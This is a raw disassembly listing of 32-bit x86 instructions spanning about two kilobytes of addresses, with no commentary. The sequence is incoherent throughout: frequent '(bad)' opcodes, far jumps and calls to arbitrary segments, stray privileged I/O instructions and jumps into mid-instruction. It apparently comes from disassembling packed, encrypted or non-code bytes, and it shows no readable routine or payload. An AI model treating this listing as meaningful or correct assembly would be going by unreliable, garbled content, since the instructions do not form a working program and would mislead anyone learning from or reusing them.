  4211d4:	mov    BYTE PTR [ecx],ah
  4211d6:	cmovle esp,DWORD PTR es:[ecx-0x2b]
  4211db:	and    al,0x3d
  4211dd:	xlat   BYTE PTR ds:[ebx]
  4211de:	mov    ebx,0x21dfc8dd
  4211e3:	mov    bh,0x26
  4211e5:	loopne 0x4211cf
  4211e7:	imul   edx,DWORD PTR [esi],0x6e7d9a59
  4211ed:	add    DWORD PTR [edi-0x6ab52c5f],ecx
  4211f3:	pop    edx
  4211f4:	loop   0x421191
  4211f6:	inc    eax
  4211f7:	test   BYTE PTR [esi-0x2f],bl
  4211fa:	loope  0x4211ec
  4211fc:	cmp    eax,0xac3af78
  421201:	popa   
  421202:	test   dl,bl
  421204:	test   eax,0xdd3ec786
  421209:	xchg   esi,ebp
  42120b:	retf   0x827b
  42120e:	jmp    0xffd9:0xed9ea62
  421215:	or     ebp,esi
  421217:	sub    DWORD PTR [ebx],ebp
  421219:	cld    
  42121a:	retf   0xc4ed
  42121d:	xor    eax,0x8052df0
  421222:	pop    ecx
  421223:	and    DWORD PTR [ebp+0x7d],ebx
  421226:	sbb    DWORD PTR [edi+0x38],ebp
  421229:	popa   
  42122a:	and    ebx,edx
  42122c:	into   
  42122d:	xor    bl,0x2f
  421230:	xchg   esp,eax
  421231:	push   0x307377ee
  421236:	mov    WORD PTR [edi-0x47],es
  421239:	fidiv  DWORD PTR [esi]
  42123b:	mov    eax,ds:0xd8c6a8c5
  421240:	das    
  421241:	into   
  421242:	rcl    DWORD PTR [edi-0x54cf5aa2],cl
  421248:	push   eax
  421249:	aad    0x28
  42124b:	jp     0x42122c
  42124d:	pusha  
  42124e:	(bad)  
  42124f:	sub    DWORD PTR [edi-0x21621874],esp
  421255:	sub    dh,0x5
  421258:	cmp    al,0x6a
  42125a:	lahf   
  42125b:	sub    BYTE PTR [ebp+0x2d],ah
  42125e:	push   eax
  42125f:	mov    eax,ds:0xe659b3c5
  421264:	cld    
  421265:	push   ebp
  421266:	xor    bl,BYTE PTR [ebx+ebx*2]
  421269:	stc    
  42126a:	lea    edx,[edi+0x78]
  42126d:	cli    
  42126e:	mov    fs,WORD PTR [edi]
  421270:	dec    ecx
  421271:	pop    ebx
  421272:	mov    DWORD PTR [ecx+0x307b5403],esp
  421278:	or     DWORD PTR [edx],0x42
  42127b:	dec    esp
  42127c:	and    dh,BYTE PTR [ebx+0x7229a828]
  421282:	push   ecx
  421283:	test   al,0xee
  421285:	mov    eax,ds:0x60c7e86f
  42128a:	push   ebp
  42128b:	das    
  42128c:	ds xchg ecx,eax
  42128e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42128f:	sub    BYTE PTR [edi+0x30],bl
  421292:	add    BYTE PTR [ebx+0x6c2d7afa],ch
  421298:	loope  0x4212e8
  42129a:	xchg   edi,eax
  42129b:	mov    esp,0xa199be9a
  4212a0:	and    eax,0x70a7336e
  4212a5:	or     al,0xa2
  4212a7:	pushf  
  4212a8:	pop    ebp
  4212a9:	stc    
  4212aa:	scas   eax,DWORD PTR es:[edi]
  4212ab:	mov    ebp,0xa8debda0
  4212b0:	mov    fs,WORD PTR [edi+0x2baa504]
  4212b6:	jne    0x42126b
  4212b8:	retf   
  4212b9:	loopne 0x421258
  4212bb:	add    bh,BYTE PTR [ecx]
  4212bd:	pusha  
  4212be:	jmp    0x42125f
  4212c0:	jmp    0x421246
  4212c2:	les    eax,FWORD PTR [edx+0x61]
  4212c5:	xchg   ecx,eax
  4212c6:	pop    esi
  4212c7:	rol    BYTE PTR [ecx],cl
  4212c9:	inc    edx
  4212ca:	out    0x48,al
  4212cc:	test   al,0x20
  4212ce:	cli    
  4212cf:	xor    al,BYTE PTR [esi+eax*8-0x62ad552b]
  4212d6:	jl     0x421261
  4212d8:	ficomp WORD PTR [esi]
  4212da:	outs   dx,BYTE PTR ds:[esi]
  4212db:	mov    edi,0xa2b3a39c
  4212e0:	ins    BYTE PTR es:[edi],dx
  4212e1:	mov    bh,0xde
  4212e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4212e4:	stc    
  4212e5:	pop    ds
  4212e6:	shl    esp,cl
  4212e8:	(bad)  
  4212e9:	push   0x925c89e5
  4212ee:	mov    eax,ds:0xe296916f
  4212f3:	mov    al,ds:0xab48892d
  4212f8:	cmp    al,BYTE PTR [ecx-0x66]
  4212fb:	mov    bh,0x5e
  4212fd:	daa    
  4212fe:	dec    esp
  4212ff:	cld    
  421300:	mov    edi,DWORD PTR [ecx+0x6084cf28]
  421306:	jmp    0x1aad9da0
  42130b:	mov    cl,0x3c
  42130d:	or     ch,dh
  42130f:	loop   0x42134e
  421311:	ret    
  421312:	xchg   DWORD PTR [ecx-0x1e],ebp
  421315:	stos   DWORD PTR es:[edi],eax
  421316:	mov    gs,WORD PTR [edx+0x3167426a]
  42131c:	aaa    
  42131d:	addr16 jns 0x421320
  421320:	jle    0x4212b5
  421322:	jae    0x421333
  421324:	arpl   WORD PTR ds:0xc9d077e7,dx
  42132a:	(bad)  
  42132b:	push   esp
  42132c:	dec    esi
  42132d:	fsubr  QWORD PTR [ecx-0x7a9efc47]
  421333:	fidivr WORD PTR [ecx-0x4ddf2403]
  421339:	sub    al,0xee
  42133b:	fiadd  DWORD PTR [ebx-0x76dfd230]
  421341:	mov    edx,0x7d03a0b5
  421346:	mov    eax,ds:0x185eb38
  42134b:	dec    esi
  42134c:	pop    esi
  42134d:	xchg   edx,eax
  42134e:	je     0x4212e8
  421350:	pop    es
  421351:	mov    ecx,0x60a6f3fe
  421356:	sar    ebp,0xa
  421359:	mov    cl,0x28
  42135b:	jae    0x421357
  42135d:	jle    0x421346
  42135f:	popa   
  421360:	push   ebx
  421361:	bound  esi,QWORD PTR [ebx-0x37]
  421364:	fwait
  421365:	adc    eax,0x5f422c4d
  42136a:	inc    esi
  42136b:	repz sub al,BYTE PTR ss:[eax-0x710a105f]
  421373:	add    ebp,DWORD PTR [edx]
  421375:	mov    eax,ds:0x1c5e89a0
  42137a:	jno    0x4213eb
  42137c:	dec    ecx
  42137d:	push   cs
  42137e:	pop    edx
  42137f:	leave  
  421380:	push   0xc35ab961
  421385:	and    al,0x92
  421387:	jno    0x421358
  421389:	ja     0x421379
  42138b:	and    eax,ecx
  42138d:	rol    BYTE PTR [edx],0x82
  421390:	fcmovnbe st,st(7)
  421392:	mov    DWORD PTR [ecx+0x14f71a0c],esp
  421398:	and    edi,esp
  42139a:	ret    
  42139b:	cmp    eax,0xd7af035e
  4213a0:	xchg   DWORD PTR [ebp-0x29],eax
  4213a3:	jmp    0x60e8:0x8528e8af
  4213aa:	and    al,BYTE PTR [ebp-0x20997a87]
  4213b0:	sbb    eax,0xf53ce7b9
  4213b5:	and    BYTE PTR [ebx+eiz*2-0x12],bh
  4213b9:	inc    edx
  4213ba:	lock lds ebp,FWORD PTR [edx]
  4213bd:	popa   
  4213be:	jae    0x42137a
  4213c0:	xlat   BYTE PTR ds:[ebx]
  4213c1:	shl    BYTE PTR [eax],0xde
  4213c4:	sti    
  4213c5:	retf   0xd40a
  4213c8:	and    eax,0xeea2ee5a
  4213cd:	xchg   ebx,eax
  4213ce:	call   0x39a2d41b
  4213d3:	jnp    0x4213af
  4213d5:	sar    DWORD PTR ss:[ebp-0x6e],1
  4213d9:	cli    
  4213da:	jmp    0x421419
  4213dc:	xlat   BYTE PTR ds:[ebx]
  4213dd:	stos   BYTE PTR es:[edi],al
  4213de:	jp     0x4213c6
  4213e0:	aad    0xc8
  4213e2:	adc    DWORD PTR [eax-0x74],ebx
  4213e5:	pusha  
  4213e6:	repnz adc eax,DWORD PTR [edx-0x1058805c]
  4213ed:	ss lock push ecx
  4213f0:	fcomi  st,st(2)
  4213f2:	je     0x421375
  4213f4:	jno    0x421392
  4213f6:	xor    BYTE PTR [ebp+ebp*4+0x60],dh
  4213fa:	fstp   st(6)
  4213fc:	xor    eax,0xf745b5a2
  421401:	jnp    0x42145f
  421403:	ds aaa 
  421405:	sub    bl,bl
  421407:	and    BYTE PTR [ebx],dh
  421409:	mov    bh,0xb
  42140b:	jbe    0x421456
  42140d:	jp     0x421428
  42140f:	mov    eax,ds:0xb9b44fe8
  421414:	add    esi,ebx
  421416:	sub    DWORD PTR [edi],ebp
  421418:	pop    esi
  421419:	mov    BYTE PTR [edi],dl
  42141b:	xor    esp,edi
  42141d:	pushf  
  42141e:	ins    DWORD PTR es:[edi],dx
  42141f:	lods   eax,DWORD PTR ds:[esi]
  421420:	lods   al,BYTE PTR ds:[esi]
  421421:	pusha  
  421422:	fisub  WORD PTR [esp+ebp*2]
  421425:	and    esi,esi
  421427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421428:	iret   
  421429:	addr16 jmp 0x66e8b2c6
  42142f:	mov    al,ds:0x8db31c9e
  421434:	sub    al,0x61
  421436:	leave  
  421437:	imul   eax,DWORD PTR ds:0x152fb9b,0xc3a9ee80
  421441:	(bad)  
  421442:	in     eax,dx
  421443:	out    dx,al
  421444:	jmp    0x4213da
  421446:	mov    eax,es:0xae51a65c
  42144c:	fisttp WORD PTR [esi]
  42144e:	xchg   dh,al
  421450:	cmc    
  421451:	adc    edi,ebx
  421453:	xor    DWORD PTR [esi-0x75],ebx
  421456:	xchg   esp,eax
  421457:	aaa    
  421458:	mov    ebx,0x367adb83
  42145d:	sub    cl,ch
  42145f:	stos   BYTE PTR es:[edi],al
  421460:	pop    edx
  421461:	xchg   esi,eax
  421462:	into   
  421463:	xchg   edx,eax
  421464:	lock lahf 
  421466:	in     al,dx
  421467:	lods   al,BYTE PTR ds:[esi]
  421468:	pop    esi
  421469:	sti    
  42146a:	enter  0x6233,0x11
  42146e:	mov    esp,0x8d5ffb88
  421473:	icebp  
  421474:	add    BYTE PTR [ecx*2-0x195b8037],al
  42147b:	std    
  42147c:	pop    esi
  42147d:	test   DWORD PTR [edi+esi*1-0x2ac8f8f5],0x2c6f5e22
  421488:	xor    esp,DWORD PTR [esi-0x7c694c7c]
  42148e:	fld    DWORD PTR [ebp+0x5e]
  421491:	push   0xeacb8886
  421496:	adc    BYTE PTR [esi+ebp*8+0x60],0x67
  42149b:	std    
  42149c:	sub    ecx,ebp
  42149e:	in     al,dx
  42149f:	mov    BYTE PTR [eax-0x70],0xee
  4214a3:	loopne 0x4214be
  4214a5:	pushf  
  4214a6:	pop    es
  4214a7:	mov    dl,0x3f
  4214a9:	add    BYTE PTR [edi+0x55b72a1],ah
  4214af:	adc    DWORD PTR [ebx+0x5ed0ec6d],edx
  4214b5:	daa    
  4214b6:	xchg   esp,eax
  4214b7:	add    DWORD PTR [esi],esp
  4214b9:	xchg   esi,eax
  4214ba:	test   eax,0xca63eb71
  4214bf:	jl     0x42149f
  4214c1:	ds jge 0x4214e9
  4214c4:	(bad)  
  4214c5:	jo     0x42147b
  4214c7:	jns    0x4214fb
  4214c9:	and    BYTE PTR [edx-0x1b094cdf],0x89
  4214d0:	push   edx
  4214d1:	mov    BYTE PTR [eax-0x5f],0x23
  4214d5:	cmp    al,0x3f
  4214d7:	xor    eax,0xd89c017e
  4214dc:	cmp    ah,BYTE PTR [ebp+0x3d]
  4214df:	cmc    
  4214e0:	pop    ebp
  4214e1:	mov    ah,0xc3
  4214e3:	data16 cmp dh,BYTE PTR [edi+0x3e]
  4214e7:	arpl   WORD PTR [edi],di
  4214e9:	popa   
  4214ea:	pop    ebp
  4214eb:	mov    ds:0xc8fb563b,al
  4214f0:	sbb    esp,esp
  4214f2:	in     eax,dx
  4214f3:	fs stos DWORD PTR es:[edi],eax
  4214f5:	test   al,0x64
  4214f7:	jbe    0x4214b5
  4214f9:	cdq    
  4214fa:	push   edx
  4214fb:	pop    edx
  4214fc:	and    DWORD PTR [eax-0x6c],0xffffffb4
  421500:	int    0x98
  421502:	out    0xb4,al
  421504:	add    ebp,ebx
  421506:	out    0x36,eax
  421508:	loop   0x4214cf
  42150a:	push   cs
  42150b:	sahf   
  42150c:	(bad)  
  42150d:	daa    
  42150e:	in     eax,dx
  42150f:	out    0x2f,eax
  421511:	push   edx
  421512:	add    eax,0xceabcfe5
  421517:	inc    ecx
  421518:	inc    esp
  421519:	sbb    al,0x89
  42151b:	stos   DWORD PTR es:[edi],eax
  42151c:	pop    esi
  42151d:	push   ebp
  42151e:	mov    ecx,0x3e38d72b
  421523:	fwait
  421524:	daa    
  421525:	pop    edi
  421526:	mov    ch,0x78
  421528:	or     al,0xe1
  42152a:	jg     0x421576
  42152c:	sahf   
  42152d:	ds adc al,0x18
  421530:	out    dx,eax
  421531:	out    dx,eax
  421532:	out    dx,eax
  421533:	cld    
  421534:	stos   BYTE PTR es:[edi],al
  421535:	jns    0x4214c5
  421537:	loop   0x421564
  421539:	into   
  42153a:	jecxz  0x4214ca
  42153c:	lea    ebp,[ebx-0x32]
  42153f:	ret    0x606c
  421542:	mov    ch,0xd6
  421544:	aad    0x94
  421546:	jp     0x4214cc
  421548:	icebp  
  421549:	push   ecx
  42154a:	cmc    
  42154b:	jo     0x4214ce
  42154d:	lea    ebx,[ebp-0x12e5aadf]
  421553:	or     eax,0xdb3a60b9
  421558:	dec    esi
  421559:	not    DWORD PTR [ecx]
  42155b:	push   ecx
  42155c:	icebp  
  42155d:	(bad)  
  42155e:	jle    0x421539
  421560:	pop    esi
  421561:	and    BYTE PTR [esi+0x27],ah
  421564:	cmp    edx,ebp
  421566:	sahf   
  421567:	int3   
  421568:	push   0x66
  42156a:	aam    0x55
  42156c:	fmulp  st(1),st
  42156e:	inc    ebx
  42156f:	mov    ecx,0xb9d65c6f
  421574:	pop    edi
  421575:	jb     0x42152d
  421577:	cmc    
  421578:	mov    esi,0xe0295eb3
  42157d:	sbb    al,0x12
  42157f:	mov    ds:0xbf002540,eax
  421584:	add    BYTE PTR [eax],ah
  421586:	xlat   BYTE PTR ds:[ebx]
  421587:	pusha  
  421588:	loope  0x4215f5
  42158a:	in     al,0xa0
  42158c:	call   FWORD PTR [edx-0x4d13af1d]
  421592:	(bad)  
  421593:	push   esp
  421594:	scas   al,BYTE PTR es:[edi]
  421595:	mov    ebp,esi
  421597:	stc    
  421598:	mov    bh,0xe0
  42159a:	mov    dl,0x70
  42159c:	arpl   bp,di
  42159e:	inc    esp
  42159f:	repnz fist WORD PTR [edx-0x7a]
  4215a3:	gs out 0xb6,al
  4215a6:	scas   al,BYTE PTR es:[edi]
  4215a7:	jg     0x4215b3
  4215a9:	dec    eax
  4215aa:	ja     0x42156f
  4215ac:	pop    esi
  4215ad:	(bad)  
  4215ae:	in     eax,dx
  4215af:	pop    eax
  4215b0:	(bad)  
  4215b1:	mov    esi,0x59811c62
  4215b6:	stos   BYTE PTR es:[edi],al
  4215b7:	outs   dx,DWORD PTR ds:[esi]
  4215b8:	cmc    
  4215b9:	inc    esi
  4215ba:	jbe    0x4215dd
  4215bc:	(bad)  
  4215bd:	jl     0x421588
  4215bf:	and    eax,0x1ceedcd6
  4215c4:	ss and eax,0x36352cec
  4215ca:	mov    ss:0x5a3cd658,eax
  4215d0:	mov    ds:0xea142e93,al
  4215d5:	arpl   bp,bx
  4215d7:	mov    esi,0x827d25d
  4215dc:	retf   0x6100
  4215df:	push   ss
  4215e0:	mov    ds:0x2ce8af9f,al
  4215e5:	popa   
  4215e6:	mov    ds:0x83d58746,eax
  4215eb:	fldpi  
  4215ed:	inc    edi
  4215ee:	lock neg dh
  4215f1:	sub    ecx,edx
  4215f3:	loopne 0x4215a8
  4215f5:	push   ebp
  4215f6:	aas    
  4215f7:	xor    cl,BYTE PTR [esi+ecx*2-0x6a]
  4215fb:	vmulss xmm6,xmm3,DWORD PTR [ebx+0x64]
  421600:	xchg   edi,eax
  421601:	rcl    BYTE PTR [edi],0x5c
  421604:	imul   ebp,DWORD PTR [edi-0x12],0x23
  421608:	cld    
  421609:	adc    DWORD PTR [ebx],eax
  42160b:	pop    esi
  42160c:	push   0x6ea3cd02
  421611:	jg     0x421614
  421613:	push   cs
  421614:	ins    BYTE PTR es:[edi],dx
  421615:	mov    ds:0x89d5f346,eax
  42161a:	out    dx,eax
  42161b:	sub    DWORD PTR [ecx+0x2a],ebx
  42161e:	add    dh,ah
  421620:	pop    esi
  421621:	ja     0x4215eb
  421623:	hlt    
  421624:	nop
  421625:	das    
  421626:	and    esp,DWORD PTR [ecx-0x77c073f5]
  42162c:	push   edi
  42162d:	sbb    DWORD PTR [esi+0x5b515d8a],ebx
  421633:	inc    ecx
  421634:	dec    edx
  421635:	sub    cl,BYTE PTR [edi+edx*1-0x2]
  421639:	ffree  st(0)
  42163b:	mov    al,ds:0xea0e89e4
  421640:	push   es
  421641:	sbb    eax,0xea4be48d
  421646:	hlt    
  421647:	retf   0x32be
  42164a:	(bad)  
  42164b:	mov    ss,WORD PTR [ebp+0x12]
  42164e:	dec    ecx
  42164f:	out    dx,eax
  421650:	pop    ebp
  421651:	xchg   BYTE PTR [ebp+0x7d352554],ch
  421657:	push   ebp
  421658:	nop
  421659:	(bad)  
  42165a:	out    dx,al
  42165b:	xchg   esi,eax
  42165c:	lods   al,BYTE PTR ds:[esi]
  42165d:	or     al,0xd6
  42165f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421660:	jo     0x421649
  421662:	mov    esp,DWORD PTR [ecx-0x20ee3eff]
  421668:	arpl   ax,di
  42166a:	(bad)  
  42166c:	pusha  
  42166d:	dec    edi
  42166e:	jmp    0x5e00:0xf5818d55
  421675:	xchg   ebp,eax
  421676:	sbb    DWORD PTR [ebp+eax*2-0x65c230a7],esp
  42167d:	repnz ds cld 
  421680:	jnp    0x4216ba
  421682:	in     eax,dx
  421683:	(bad)  
  421685:	and    eax,0xeda54d8c
  42168a:	dec    edx
  42168b:	pop    edi
  42168c:	fldcw  WORD PTR [eax+0x28]
  42168f:	mov    dh,0x5e
  421691:	jb     0x42166c
  421693:	stos   DWORD PTR es:[di],eax
  421695:	mov    esi,0x555e09ea
  42169a:	inc    esi
  42169b:	xor    al,ch
  42169d:	sbb    eax,0x5fd8f554
  4216a2:	and    al,0x55
  4216a4:	sbb    edi,DWORD PTR [ecx-0x33]
  4216a7:	in     al,dx
  4216a8:	adc    eax,0x63ce9bb1
  4216ad:	inc    ebp
  4216ae:	mov    ah,0xe6
  4216b0:	xchg   esp,eax
  4216b1:	shl    BYTE PTR [ebx+0x51762b93],0xa2
  4216b8:	jg     0x42171b
  4216ba:	jle    0x421720
  4216bc:	pop    edi
  4216bd:	adc    edx,DWORD PTR [ebp-0x20d58b1f]
  4216c3:	aad    0x5e
  4216c5:	mov    dh,0x10
  4216c7:	pop    esp
  4216c8:	rcr    al,cl
  4216ca:	mov    esi,0x85a480a8
  4216cf:	mov    eax,ds:0xc144e2dd
  4216d4:	sbb    ah,dh
  4216d6:	mov    edx,0xf9715ee8
  4216db:	dec    ebp
  4216dc:	jg     0x421745
  4216de:	or     esi,DWORD PTR [eax-0x67d4f752]
  4216e4:	pop    esi
  4216e5:	or     bh,bl
  4216e7:	inc    esp
  4216e8:	push   cs
  4216e9:	and    edx,DWORD PTR [edi+0x3e285ebd]
  4216ef:	cs mov ebx,0x9e490409
  4216f5:	jl     0x42169d
  4216f7:	in     eax,0xe7
  4216f9:	pop    edi
  4216fa:	repnz push esp
  4216fc:	sbb    al,0xbf
  4216fe:	push   0xeed9c079
  421703:	jae    0x4216d4
  421705:	and    ah,BYTE PTR [esi+ebp*1-0x5ef2d027]
  42170c:	mov    esi,0xe92fdfd8
  421711:	mov    eax,ds:0xea64911b
  421716:	out    0xd2,eax
  421718:	add    eax,0x9736a0c1
  42171d:	(bad)  
  42171e:	dec    ebx
  42171f:	mov    eax,ds:0x1d0f7d4b
  421724:	mov    ebx,0x5eba50f3
  421729:	add    al,ah
  42172b:	or     eax,DWORD PTR [edx+0x5fd25ce5]
  421731:	popa   
  421732:	pop    edx
  421733:	jno    0x4216e7
  421735:	push   ecx
  421736:	hlt    
  421737:	lock jp 0x42171c
  42173a:	out    dx,al
  42173b:	lea    ecx,[eax-0x17]
  42173e:	add    BYTE PTR [ebx],bl
  421740:	nop
  421741:	in     eax,0xc5
  421743:	mov    al,ds:0x24e88742
  421748:	pop    ebp
  421749:	mov    ch,BYTE PTR [esi]
  42174b:	dec    edx
  42174c:	pop    esi
  42174d:	outs   dx,BYTE PTR ds:[esi]
  42174e:	sahf   
  42174f:	arpl   WORD PTR [ecx],si
  421751:	ret    0x5d4e
  421754:	jnp    0x4217b3
  421756:	int3   
  421757:	mov    eax,0xe91c6a38
  42175c:	fiadd  WORD PTR ds:0x764c68bf
  421762:	jb     0x42174e
  421764:	pop    ebp
  421765:	dec    edx
  421766:	outs   dx,BYTE PTR ds:[esi]
  421767:	addr16 inc esp
  421769:	ret    0x6345
  42176c:	mov    es,WORD PTR [ebx-0x1c055ecf]
  421772:	xchg   ecx,eax
  421773:	or     ah,dl
  421775:	retf   
  421776:	add    dl,bl
  421778:	inc    esp
  421779:	push   ss
  42177a:	ss inc ecx
  42177c:	pop    esi
  42177d:	mov    ds:0xc6bb3bf7,al
  421782:	shr    BYTE PTR [eax-0x7b91235b],0x1d
  421789:	scas   eax,DWORD PTR es:[edi]
  42178a:	inc    edi
  42178b:	pop    ebp
  42178c:	mov    ecx,0x5a2f4eb6
  421791:	std    
  421792:	stos   DWORD PTR es:[edi],eax
  421793:	xor    al,0x4f
  421795:	aam    0x6e
  421797:	mov    DWORD PTR [ebx],ebp
  421799:	sub    ecx,DWORD PTR [edi-0x5f]
  42179c:	test   BYTE PTR [esi+0x33],al
  42179f:	repz or DWORD PTR [eax],esp
  4217a2:	or     edx,esi
  4217a4:	pop    edi
  4217a5:	ror    edx,0xee
  4217a8:	leave  
  4217a9:	dec    ebp
  4217aa:	add    DWORD PTR [edx-0x6df11705],0xa2c414c4
  4217b4:	pop    ebx
  4217b5:	pop    ss
  4217b6:	int    0xff
  4217b8:	push   0xffffffa0
  4217ba:	and    al,0x59
  4217bc:	pop    esp
  4217bd:	pusha  
  4217be:	in     eax,dx
  4217bf:	into   
  4217c0:	test   esp,ebp
  4217c2:	(bad)  
  4217c3:	sbb    BYTE PTR [ecx-0x30aade3],ch
  4217c9:	pusha  
  4217ca:	mov    esp,0x4b07f2a
  4217cf:	arpl   WORD PTR [esi+edx*4],bx
  4217d2:	fisub  WORD PTR [edx]
  4217d4:	pop    ebp
  4217d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4217d6:	cld    
  4217d7:	or     eax,DWORD PTR [edi-0x5d]
  4217da:	cmp    DWORD PTR [edi],esp
  4217dc:	xchg   BYTE PTR ds:0xd8f98db6,al
  4217e2:	xchg   esp,eax
  4217e3:	mov    eax,ds:0xc2aa2480
  4217e8:	mov    edx,ebp
  4217ea:	out    dx,al
  4217eb:	popf   
  4217ec:	xchg   edx,eax
  4217ed:	push   cs
  4217ee:	jne    0x4217a9
  4217f0:	mov    dh,BYTE PTR [eax-0x44f77163]
  4217f6:	push   0x6d18c9a1
  4217fb:	(bad)  
  4217fc:	into   
  4217fd:	push   ds
  4217fe:	out    dx,al
  4217ff:	add    BYTE PTR [edx+0x58],bh
  421802:	sbb    BYTE PTR [esi-0x7],ch
  421805:	and    ch,BYTE PTR [edi+ecx*4-0x7f]
  421809:	sub    ebx,0x85c8fca0
  42180f:	ja     0x421845
  421811:	pop    eax
  421812:	in     eax,dx
  421813:	aad    0x10
  421815:	adc    ebp,DWORD PTR [ebp+0x79]
  421818:	div    DWORD PTR [eax+0x66]
  42181b:	pop    eax
  42181c:	mov    esp,0x4b8fa860
  421821:	cmp    DWORD PTR [ebx+0x19],edi
  421824:	les    edx,FWORD PTR [esi+ebp*8]
  421827:	into   
  421828:	mov    ebp,0xe5fc865b
  42182d:	add    eax,0xf9faa0b7
  421832:	out    0x7c,eax
  421834:	jbe    0x421846
  421836:	xor    BYTE PTR [esi+ebx*2+0x32],0x88
  42183b:	jp     0x4217f3
  42183d:	clc    
  42183e:	pop    ecx
  42183f:	icebp  
  421840:	mov    edi,0x6e950260
  421845:	sbb    ebx,DWORD PTR [esi-0x11c5503c]
  42184b:	push   edx
  42184c:	mov    ecx,0x62a7947b
  421851:	fnstsw WORD PTR [ebx+0x4135a1a0]
  421857:	sub    eax,0xe8f7338e
  42185c:	pop    esi
  42185d:	jmp    0x665:0xfe411996
  421864:	mov    bl,0x5d
  421866:	(bad)  
  421867:	sbb    DWORD PTR [edx-0x71],ebx
  42186a:	add    DWORD PTR [eax],eax
  42186c:	mov    esi,0x5eefad46
  421871:	ja     0x42189d
  421873:	jl     0x42183c
  421875:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421876:	test   eax,0xbc60a24f
  42187b:	and    ch,al
  42187d:	push   0x88883cbe
  421882:	out    dx,al
  421883:	xchg   ebp,eax
  421884:	enter  0xa52a,0x82
  421888:	cmc    
  421889:	ss cdq 
  42188b:	mov    eax,ds:0xf070383b
  421890:	fnstenv [ecx+0x5a]
  421893:	inc    ebx
  421894:	push   ebx
  421895:	and    BYTE PTR [edi],bl
  421897:	adc    bl,BYTE PTR [esi-0x74]
  42189a:	jle    0x421869
  42189c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42189d:	js     0x42181f
  42189f:	mov    eax,ds:0x7348ce86
  4218a4:	jb     0x421915
  4218a6:	mov    edi,DWORD PTR [edx+0x4b]
  4218a9:	pop    ss
  4218aa:	loop   0x4218b1
  4218ac:	pop    ebx
  4218ad:	cmp    dh,dh
  4218af:	lods   al,BYTE PTR ds:[esi]
  4218b0:	out    dx,al
  4218b1:	adc    edi,DWORD PTR [eax+0x64]
  4218b4:	ss popa 
  4218b6:	rcl    DWORD PTR [edi-0x69],0x8
  4218ba:	mov    WORD PTR [edx-0x5f],cs
  4218bd:	pop    ebx
  4218be:	jmp    0x4218db
  4218c0:	and    al,0xf0
  4218c2:	push   ss
  4218c3:	ja     0x4218a4
  4218c5:	test   al,0x54
  4218c7:	sahf   
  4218c8:	div    BYTE PTR [edx-0x31]
  4218cb:	(bad)  
  4218cc:	stos   BYTE PTR es:[edi],al
  4218cd:	pusha  
  4218ce:	call   0x5e59:0x4884898c
  4218d5:	dec    esi
  4218d6:	jmp    0x7c238204
  4218db:	fsubr  DWORD PTR [esi-0x57672aa0]
  4218e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218e2:	je     0x421897
  4218e4:	pop    ebp
  4218e5:	and    BYTE PTR [edx+0x7e],ah
  4218e8:	pop    esi
  4218e9:	adc    DWORD PTR [ebx-0x5],ebp
  4218ec:	inc    edx
  4218ed:	mov    ch,bl
  4218ef:	add    esp,DWORD PTR [eax]
  4218f1:	popa   
  4218f2:	mov    ebp,0xd7886ad9
  4218f7:	ins    BYTE PTR es:[edi],dx
  4218f8:	daa    
  4218f9:	lods   al,BYTE PTR ds:[esi]
  4218fa:	out    dx,al
  4218fb:	dec    BYTE PTR [edi]
  4218fd:	pop    eax
  4218fe:	adc    ebp,DWORD PTR [ebx]
  421900:	test   BYTE PTR [eax],ch
  421902:	sub    BYTE PTR [ecx+0x69066ec0],dh
  421908:	nop
  421909:	push   edx
  42190a:	add    cl,BYTE PTR [ecx+0x4f2d1e67]
  421910:	pmulhuw mm3,mm5
  421913:	xchg   ecx,eax
  421914:	ror    DWORD PTR ds:[ebx-0x5e],cl
  421918:	sbb    al,BYTE PTR ds:0xedbc521c
  42191e:	retf   0xeb01
  421921:	shl    BYTE PTR [edi],0xdc
  421924:	pop    esi
  421925:	adc    eax,0xaedd8239
  42192a:	xchg   BYTE PTR [esi+0x475541ca],ch
  421930:	inc    edi
  421931:	mov    eax,ds:0x91f3952c
  421936:	test   al,0x5c
  421938:	pop    esi
  421939:	push   cs
  42193a:	popf   
  42193b:	pop    edx
  42193c:	and    ecx,DWORD PTR [edi]
  42193e:	or     ecx,DWORD PTR [ebx+ecx*8+0x5f]
  421942:	sbb    eax,esi
  421944:	xchg   BYTE PTR [ebx-0x36],dh
  421947:	and    dh,ch
  421949:	xchg   esp,eax
  42194a:	ds ss push cs
  42194d:	ins    DWORD PTR es:[edi],dx
  42194e:	push   eax
  42194f:	imul   edx,DWORD PTR [ebx+0x1e],0xd23853cc
  421956:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421957:	outs   dx,DWORD PTR ds:[esi]
  421958:	mov    DWORD PTR [edi+0x32],edi
  42195b:	fcom   QWORD PTR [edi-0x43]
  42195e:	ss int 0x61
  421961:	popa   
  421962:	inc    ebp
  421963:	call   0x90f9:0xc05ac7a6
  42196a:	out    dx,al
  42196b:	test   eax,0x6ed5d8c9
  421970:	xor    esi,eax
  421972:	mov    bl,0xa3
  421974:	jg     0x4219f5
  421976:	fwait
  421977:	scas   eax,DWORD PTR es:[edi]
  421978:	(bad)  [eax]
  42197a:	xchg   BYTE PTR [edx],cl
  42197c:	mov    ch,0x89
  42197e:	in     eax,dx
  42197f:	mov    edx,0x3c79e718
  421984:	add    DWORD PTR [eax],0x59a080cf
  42198a:	sar    esp,cl
  42198c:	enter  0x62f4,0x6b
  421990:	mov    WORD PTR [eax-0x37],fs
  421993:	adc    ebx,esp
  421995:	rcr    ebp,cl
  421997:	jne    0x4219f7
  421999:	loope  0x42199b
  42199b:	fidivr WORD PTR [ecx+0x17]
  42199e:	ret    
  42199f:	sbb    al,0xcd
  4219a1:	pop    esi
  4219a2:	inc    DWORD PTR [esi+0x4b]
  4219a5:	add    dl,BYTE PTR [esi+edi*1+0x71]
  4219a9:	inc    eax
  4219aa:	jo     0x421984
  4219ac:	cmp    eax,0xc9a159b1
  4219b1:	test   DWORD PTR [ebx+edx*8-0x24],ecx
  4219b5:	mov    bl,0xc
  4219b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
